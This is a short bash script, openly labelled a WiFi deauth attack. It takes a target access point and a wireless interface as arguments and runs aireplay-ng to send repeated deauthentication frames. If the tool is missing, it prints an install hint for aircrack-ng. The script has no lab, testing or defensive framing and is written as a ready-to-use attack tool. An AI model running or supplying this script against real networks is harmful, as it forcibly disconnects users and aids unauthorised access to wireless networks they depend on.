#!/bin/bash
# WiFi Deauth Attack Script
echo "Starting WiFi deauth attack..."
echo "Target: $1"
echo "Interface: $2"

# Deauth attack (requires aircrack-ng)
if command -v aireplay-ng &> /dev/null; then
    aireplay-ng -0 10 -a $1 $2
else
    echo "aireplay-ng not found. Install with: sudo apt install aircrack-ng"
fi
